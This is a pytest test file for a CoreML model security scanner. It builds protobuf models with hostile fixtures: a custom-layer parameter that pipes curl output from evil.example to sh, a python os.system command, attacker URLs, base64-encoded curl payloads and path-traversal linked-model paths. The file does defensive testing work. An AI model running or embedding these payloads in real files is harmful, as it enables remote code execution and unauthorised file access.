from __future__ import annotations

import base64
from pathlib import Path

from modelaudit.scanners.base import IssueSeverity
from modelaudit.scanners.coreml_scanner import CoreMLScanner
from modelaudit.utils.file.detection import detect_file_format, detect_format_from_extension


def _encode_varint(value: int) -> bytes:
    out = bytearray()
    while value >= 0x80:
        out.append((value & 0x7F) | 0x80)
        value >>= 7
    out.append(value)
    return bytes(out)


def _field_varint(field_number: int, value: int) -> bytes:
    return _encode_varint((field_number << 3) | 0) + _encode_varint(value)


def _field_bytes(field_number: int, value: bytes) -> bytes:
    return _encode_varint((field_number << 3) | 2) + _encode_varint(len(value)) + value


def _build_user_metadata_entry(key: str, value: str) -> bytes:
    return _field_bytes(1, key.encode("utf-8")) + _field_bytes(2, value.encode("utf-8"))


def _build_metadata(
    *,
    short_description: str = "Safe CoreML model",
    user_defined: dict[str, str] | None = None,
) -> bytes:
    metadata = _field_bytes(1, short_description.encode("utf-8"))
    metadata += _field_bytes(2, b"1.0.0")
    metadata += _field_bytes(3, b"ModelAudit Tests")
    metadata += _field_bytes(4, b"MIT")

    if user_defined:
        for key, value in user_defined.items():
            metadata += _field_bytes(100, _build_user_metadata_entry(key, value))

    return metadata


def _build_description(*, metadata: bytes) -> bytes:
    return _field_bytes(100, metadata)


def _build_custom_parameter(key: str, string_value: str) -> bytes:
    param_value = _field_bytes(20, string_value.encode("utf-8"))  # CustomLayerParamValue.stringValue
    return _field_bytes(1, key.encode("utf-8")) + _field_bytes(2, param_value)


def _build_layer(name: str, *, custom_class: str | None = None, custom_params: dict[str, str] | None = None) -> bytes:
    layer = _field_bytes(1, name.encode("utf-8"))
    if custom_class is None:
        return layer

    custom = _field_bytes(10, custom_class.encode("utf-8"))  # CustomLayerParams.className
    if custom_params:
        for key, value in custom_params.items():
            custom += _field_bytes(30, _build_custom_parameter(key, value))
    layer += _field_bytes(500, custom)  # NeuralNetworkLayer.custom
    return layer


def _build_neural_network(*, layers: list[bytes]) -> bytes:
    return b"".join(_field_bytes(1, layer) for layer in layers)  # NeuralNetwork.layers


def _build_linked_model(*, file_name: str, search_path: str | None = None) -> bytes:
    linked_model_file = _field_bytes(1, _field_bytes(1, file_name.encode("utf-8")))
    if search_path is not None:
        linked_model_file += _field_bytes(2, _field_bytes(1, search_path.encode("utf-8")))
    return _field_bytes(1, linked_model_file)


def _build_pipeline_wrapper(child_model: bytes) -> bytes:
    return _field_bytes(1, _field_bytes(1, child_model))


def _build_model(
    *,
    description: bytes,
    neural_network: bytes | None = None,
    linked_model: bytes | None = None,
    custom_model_class: str | None = None,
    pipeline_wrapper: bytes | None = None,
) -> bytes:
    model = _field_varint(1, 8)  # specificationVersion
    model += _field_bytes(2, description)  # description
    if pipeline_wrapper is not None:
        model += _field_bytes(200, pipeline_wrapper)  # pipelineClassifier
    if neural_network is not None:
        model += _field_bytes(500, neural_network)  # neuralNetwork
    if custom_model_class is not None:
        model += _field_bytes(555, _field_bytes(10, custom_model_class.encode("utf-8")))  # customModel.className
    if linked_model is not None:
        model += _field_bytes(556, linked_model)  # linkedModel
    return model


def _write_model(path: Path, content: bytes) -> Path:
    path.write_bytes(content)
    return path


def test_coreml_scanner_can_handle_strict_detection(tmp_path: Path) -> None:
    safe_model_path = _write_model(
        tmp_path / "safe.mlmodel",
        _build_model(
            description=_build_description(metadata=_build_metadata()),
            neural_network=_build_neural_network(layers=[_build_layer("dense_1")]),
        ),
    )

    assert CoreMLScanner.can_handle(str(safe_model_path)) is True

    renamed_text = tmp_path / "not_coreml.mlmodel"
    renamed_text.write_text("not a protobuf model", encoding="utf-8")
    assert CoreMLScanner.can_handle(str(renamed_text)) is False


def test_coreml_scanner_benign_model(tmp_path: Path) -> None:
    safe_model_path = _write_model(
        tmp_path / "safe.mlmodel",
        _build_model(
            description=_build_description(
                metadata=_build_metadata(
                    user_defined={
                        "com.github.apple.coremltools.version": "7.2",
                        "notes": "execution benchmark summary for mobile profile",
                    }
                )
            ),
            neural_network=_build_neural_network(layers=[_build_layer("conv_1"), _build_layer("relu_1")]),
        ),
    )

    scanner = CoreMLScanner()
    result = scanner.scan(str(safe_model_path))

    assert result.success is True
    assert result.has_errors is False
    assert result.has_warnings is False
    assert result.metadata.get("specification_version") == 8
    assert detect_file_format(str(safe_model_path)) == "coreml"
    assert detect_format_from_extension(str(safe_model_path)) == "coreml"


def test_coreml_scanner_preserves_metadata_for_root_and_nested_models(tmp_path: Path) -> None:
    nested_model = _build_model(
        description=_build_description(
            metadata=_build_metadata(
                short_description="Nested model metadata",
                user_defined={"nested_key": "nested-value"},
            )
        ),
        neural_network=_build_neural_network(layers=[_build_layer("nested_dense")]),
    )
    model_path = _write_model(
        tmp_path / "nested_metadata.mlmodel",
        _build_model(
            description=_build_description(
                metadata=_build_metadata(
                    short_description="Root model metadata",
                    user_defined={"root_key": "root-value"},
                )
            ),
            pipeline_wrapper=_build_pipeline_wrapper(nested_model),
        ),
    )

    result = CoreMLScanner().scan(str(model_path))

    assert result.success is True
    root_metadata = result.metadata.get("coreml_metadata")
    assert isinstance(root_metadata, dict)
    assert root_metadata["shortDescription"] == "Root model metadata"
    assert root_metadata["author"] == "ModelAudit Tests"
    assert result.metadata.get("user_defined_metadata") == {"root_key": "root-value"}

    metadata_by_model = result.metadata.get("coreml_metadata_by_model")
    assert isinstance(metadata_by_model, dict)
    assert metadata_by_model["model"]["shortDescription"] == "Root model metadata"
    nested_metadata = [
        metadata
        for model_key, metadata in metadata_by_model.items()
        if model_key != "model" and metadata.get("shortDescription") == "Nested model metadata"
    ]
    assert nested_metadata

    user_metadata_by_model = result.metadata.get("user_defined_metadata_by_model")
    assert isinstance(user_metadata_by_model, dict)
    assert user_metadata_by_model["model"] == {"root_key": "root-value"}
    assert any(
        model_key != "model" and metadata.get("nested_key") == "nested-value"
        for model_key, metadata in user_metadata_by_model.items()
    )


def test_coreml_scanner_detects_custom_layer_and_parameter_payload(tmp_path: Path) -> None:
    malicious_model = _write_model(
        tmp_path / "malicious_custom_layer.mlmodel",
        _build_model(
            description=_build_description(metadata=_build_metadata()),
            neural_network=_build_neural_network(
                layers=[
                    _build_layer(
                        "custom_1",
                        custom_class="EvilRuntimeLayer",
                        custom_params={"postprocess_script": "bash -c 'curl https://evil.example/p.sh | sh'"},
                    )
                ]
            ),
        ),
    )

    result = CoreMLScanner().scan(str(malicious_model))

    assert result.success is False
    critical_issues = [issue for issue in result.issues if issue.severity == IssueSeverity.CRITICAL]
    assert any("Custom CoreML layer detected" in issue.message for issue in critical_issues)
    assert any("custom_1" in issue.details.get("layer_name", "") for issue in critical_issues)
    assert any("field_path" in issue.details for issue in critical_issues)


def test_coreml_scanner_detects_metadata_command_and_network_patterns(tmp_path: Path) -> None:
    metadata = _build_metadata(
        user_defined={
            "postprocess_script": "python -c 'import os; os.system(\"whoami\")'",
            "model_url": "https://attacker.example/download",
        }
    )
    malicious_model = _write_model(
        tmp_path / "malicious_metadata.mlmodel",
        _build_model(
            description=_build_description(metadata=metadata),
            neural_network=_build_neural_network(layers=[_build_layer("dense_1")]),
        ),
    )

    result = CoreMLScanner().scan(str(malicious_model))

    script_findings = [
        issue
        for issue in result.issues
        if issue.details.get("metadata_key") == "postprocess_script"
        and "Suspicious command pattern in CoreML metadata key" in issue.message
    ]
    url_findings = [
        issue
        for issue in result.issues
        if issue.details.get("metadata_key") == "model_url"
        and "Suspicious network pattern in CoreML metadata key" in issue.message
    ]

    assert script_findings
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in script_findings)
    assert url_findings
    assert any(issue.severity == IssueSeverity.WARNING for issue in url_findings)
    assert any("field_path" in issue.details for issue in result.issues)


def test_coreml_scanner_safe_metadata_keys_still_scan_suspicious_urls(tmp_path: Path) -> None:
    metadata = _build_metadata(
        user_defined={
            "com.github.apple.coremltools.source": "https://attacker.example/payload",
        }
    )
    model_path = _write_model(
        tmp_path / "safe_key_network_url.mlmodel",
        _build_model(
            description=_build_description(metadata=metadata),
            neural_network=_build_neural_network(layers=[_build_layer("dense_1")]),
        ),
    )

    result = CoreMLScanner().scan(str(model_path))
    findings = [
        issue
        for issue in result.issues
        if issue.details.get("metadata_key") == "com.github.apple.coremltools.source"
        and issue.details.get("pattern_type") == "network"
    ]

    assert findings
    assert all(issue.severity == IssueSeverity.WARNING for issue in findings)


def test_coreml_scanner_detects_python3_command_in_metadata(tmp_path: Path) -> None:
    metadata = _build_metadata(user_defined={"postprocess_script": "python3 -c 'print(1)'"})
    model_path = _write_model(
        tmp_path / "python3_metadata.mlmodel",
        _build_model(
            description=_build_description(metadata=metadata),
            neural_network=_build_neural_network(layers=[_build_layer("dense_1")]),
        ),
    )

    result = CoreMLScanner().scan(str(model_path))

    assert result.success is False
    assert any(
        issue.severity == IssueSeverity.CRITICAL
        and issue.details.get("metadata_key") == "postprocess_script"
        and issue.details.get("pattern_type") == "command"
        for issue in result.issues
    )


def test_coreml_scanner_encoded_metadata_is_warning_without_secondary_signals(tmp_path: Path) -> None:
    encoded_payload = base64.b64encode(b"curl https://evil.example/payload\n" * 16).decode("ascii")
    model_path = _write_model(
        tmp_path / "encoded_metadata.mlmodel",
        _build_model(
            description=_build_description(metadata=_build_metadata(user_defined={"notes_blob": encoded_payload})),
            neural_network=_build_neural_network(layers=[_build_layer("dense_1")]),
        ),
    )

    result = CoreMLScanner().scan(str(model_path))

    encoded_issues = [
        issue for issue in result.issues if "Encoded metadata payload detected for key 'notes_blob'" in issue.message
    ]
    assert encoded_issues
    assert all(issue.severity == IssueSeverity.WARNING for issue in encoded_issues)


def test_coreml_scanner_exec_word_in_benign_context_is_not_critical(tmp_path: Path) -> None:
    model_path = _write_model(
        tmp_path / "benign_exec_word.mlmodel",
        _build_model(
            description=_build_description(
                metadata=_build_metadata(
                    user_defined={
                        "notes": "Execution metrics from evaluation pipeline. No command invocation.",
                        "label": "image classifier",
                    }
                )
            ),
            neural_network=_build_neural_network(layers=[_build_layer("dense_1")]),
        ),
    )

    result = CoreMLScanner().scan(str(model_path))
    assert all(issue.severity != IssueSeverity.CRITICAL for issue in result.issues)


def test_coreml_scanner_detects_unsafe_linked_model_paths(tmp_path: Path) -> None:
    linked_model = _build_linked_model(file_name="../outside.mlmodel", search_path="/tmp/shared-models")
    model_path = _write_model(
        tmp_path / "linked_model.mlmodel",
        _build_model(
            description=_build_description(metadata=_build_metadata()),
            neural_network=_build_neural_network(layers=[_build_layer("dense_1")]),
            linked_model=linked_model,
        ),
    )

    result = CoreMLScanner().scan(str(model_path))
    linked_path_issues = [
        issue for issue in result.issues if "Unsafe CoreML linked-model path reference" in issue.message
    ]

    assert linked_path_issues
    assert any("model[556].linkedModelFile" in issue.details.get("field_path", "") for issue in linked_path_issues)
    assert any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in linked_path_issues)


def test_coreml_scanner_detects_windows_absolute_linked_model_paths(tmp_path: Path) -> None:
    linked_model = _build_linked_model(file_name=r"C:\Windows\System32\drivers\etc\hosts")
    model_path = _write_model(
        tmp_path / "windows_linked_model.mlmodel",
        _build_model(
            description=_build_description(metadata=_build_metadata()),
            neural_network=_build_neural_network(layers=[_build_layer("dense_1")]),
            linked_model=linked_model,
        ),
    )

    result = CoreMLScanner().scan(str(model_path))
    linked_path_issues = [
        issue for issue in result.issues if "Unsafe CoreML linked-model path reference" in issue.message
    ]

    assert result.success is False
    assert any(issue.details.get("reason") == "absolute linked model path" for issue in linked_path_issues)
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in linked_path_issues)


def test_coreml_scanner_detects_bundle_macro_path_traversal(tmp_path: Path) -> None:
    linked_model = _build_linked_model(file_name="$BUNDLE_MAIN/../../outside.mlmodel")
    model_path = _write_model(
        tmp_path / "bundle_macro_traversal.mlmodel",
        _build_model(
            description=_build_description(metadata=_build_metadata()),
            neural_network=_build_neural_network(layers=[_build_layer("dense_1")]),
            linked_model=linked_model,
        ),
    )

    result = CoreMLScanner().scan(str(model_path))

    assert result.success is False
    assert any(
        issue.severity == IssueSeverity.CRITICAL
        and issue.details.get("reason") == "path traversal segments in linked model path"
        and issue.details.get("raw_path") == "$BUNDLE_MAIN/../../outside.mlmodel"
        for issue in result.issues
    )


def test_coreml_scanner_detects_custom_layers_nested_in_pipeline_models(tmp_path: Path) -> None:
    nested_model = _build_model(
        description=_build_description(metadata=_build_metadata()),
        neural_network=_build_neural_network(layers=[_build_layer("nested_custom", custom_class="EvilPipelineLayer")]),
    )
    model_path = _write_model(
        tmp_path / "pipeline_custom_layer.mlmodel",
        _build_model(
            description=_build_description(metadata=_build_metadata()),
            pipeline_wrapper=_build_pipeline_wrapper(nested_model),
        ),
    )

    result = CoreMLScanner().scan(str(model_path))

    assert result.success is False
    assert any(
        issue.severity == IssueSeverity.CRITICAL
        and "Custom CoreML layer detected" in issue.message
        and issue.details.get("layer_name") == "nested_custom"
        and issue.details.get("class_name") == "EvilPipelineLayer"
        for issue in result.issues
    )


def test_coreml_scanner_detects_linked_model_nested_in_pipeline_models(tmp_path: Path) -> None:
    nested_model = _build_model(
        description=_build_description(metadata=_build_metadata()),
        neural_network=_build_neural_network(layers=[_build_layer("nested_dense")]),
        linked_model=_build_linked_model(file_name="../nested/escape.mlmodel"),
    )
    model_path = _write_model(
        tmp_path / "pipeline_linked_model.mlmodel",
        _build_model(
            description=_build_description(metadata=_build_metadata()),
            pipeline_wrapper=_build_pipeline_wrapper(nested_model),
        ),
    )

    result = CoreMLScanner().scan(str(model_path))

    assert result.success is False
    assert any(
        issue.severity == IssueSeverity.CRITICAL
        and "Unsafe CoreML linked-model path reference" in issue.message
        and "][1:0][556].linkedModelFile.linkedModelFileName.defaultValue" in issue.details.get("field_path", "")
        and issue.details.get("reason") == "path traversal segments in linked model path"
        for issue in result.issues
    )


def test_coreml_scanner_detects_custom_model_nested_in_pipeline_models(tmp_path: Path) -> None:
    nested_model = _build_model(
        description=_build_description(metadata=_build_metadata()),
        neural_network=_build_neural_network(layers=[_build_layer("nested_dense")]),
        custom_model_class="NestedPipelineRuntime",
    )
    model_path = _write_model(
        tmp_path / "pipeline_custom_model.mlmodel",
        _build_model(
            description=_build_description(metadata=_build_metadata()),
            pipeline_wrapper=_build_pipeline_wrapper(nested_model),
        ),
    )

    result = CoreMLScanner().scan(str(model_path))

    assert result.success is False
    assert any(
        issue.severity == IssueSeverity.CRITICAL
        and "CoreML custom model class detected" in issue.message
        and issue.details.get("class_name") == "NestedPipelineRuntime"
        and "][1:0][555].className" in issue.details.get("field_path", "")
        for issue in result.issues
    )


def test_coreml_scanner_recursion_limit_fails_closed(tmp_path: Path) -> None:
    nested_model = _build_model(
        description=_build_description(metadata=_build_metadata()),
        custom_model_class="TooDeepRuntime",
    )
    for _ in range(CoreMLScanner.MAX_RECURSIVE_MESSAGE_DEPTH + 2):
        nested_model = _build_model(
            description=_build_description(metadata=_build_metadata()),
            pipeline_wrapper=_build_pipeline_wrapper(nested_model),
        )

    model_path = _write_model(tmp_path / "deep_pipeline.mlmodel", nested_model)

    result = CoreMLScanner().scan(str(model_path))

    assert result.success is False
    assert any(
        issue.severity == IssueSeverity.CRITICAL
        and "traversal reached the safe depth limit" in issue.message
        and issue.details.get("max_recursive_message_depth") == CoreMLScanner.MAX_RECURSIVE_MESSAGE_DEPTH
        for issue in result.issues
    )


def test_coreml_scanner_recursion_limit_succeeds_just_below_limit(tmp_path: Path) -> None:
    nested_model = _build_model(
        description=_build_description(metadata=_build_metadata()),
        neural_network=_build_neural_network(layers=[_build_layer("leaf_dense")]),
    )
    for _ in range(CoreMLScanner.MAX_RECURSIVE_MESSAGE_DEPTH):
        nested_model = _build_model(
            description=_build_description(metadata=_build_metadata()),
            pipeline_wrapper=_build_pipeline_wrapper(nested_model),
        )

    model_path = _write_model(tmp_path / "just_below_limit_pipeline.mlmodel", nested_model)

    result = CoreMLScanner().scan(str(model_path))

    assert result.success is True
    assert not any(
        issue.severity == IssueSeverity.CRITICAL and "traversal reached the safe depth limit" in issue.message
        for issue in result.issues
    )


def test_coreml_scanner_malformed_custom_model_fails_closed(tmp_path: Path) -> None:
    model_path = _write_model(
        tmp_path / "malformed_custom_model.mlmodel",
        _field_varint(1, 8)
        + _field_bytes(2, _build_description(metadata=_build_metadata()))
        + _field_bytes(555, b"\x00"),
    )

    result = CoreMLScanner().scan(str(model_path))

    assert result.success is False
    assert any(
        issue.severity == IssueSeverity.CRITICAL
        and "Unable to parse CoreML custom model block" in issue.message
        and issue.details.get("field_path") == "model[555]"
        for issue in result.issues
    )


def test_coreml_scanner_truncated_linked_model_file_fails_closed(tmp_path: Path) -> None:
    malformed_linked_model = _field_bytes(1, b"\x0a\x05abc")
    model_path = _write_model(
        tmp_path / "malformed_linked_model_file.mlmodel",
        _build_model(
            description=_build_description(metadata=_build_metadata()),
            neural_network=_build_neural_network(layers=[_build_layer("dense_1")]),
            linked_model=malformed_linked_model,
        ),
    )

    result = CoreMLScanner().scan(str(model_path))

    assert result.success is False
    assert any(
        issue.severity == IssueSeverity.CRITICAL
        and "Unable to parse CoreML linked-model file entry" in issue.message
        and issue.details.get("field_path") == "model[556].linkedModelFile"
        and issue.details.get("parse_error") == "truncated length-delimited field 1"
        for issue in result.issues
    )


def test_coreml_scanner_corrupt_protobuf_handling(tmp_path: Path) -> None:
    corrupt_path = tmp_path / "corrupt.mlmodel"
    # Truncated length-delimited field
    corrupt_path.write_bytes(b"\x08\x08\x12\x0aabc")

    result = CoreMLScanner().scan(str(corrupt_path))

    assert result.success is False
    assert any(
        "Invalid CoreML protobuf structure" in issue.message or "CoreML .mlmodel protobuf structure" in issue.message
        for issue in result.issues
    )
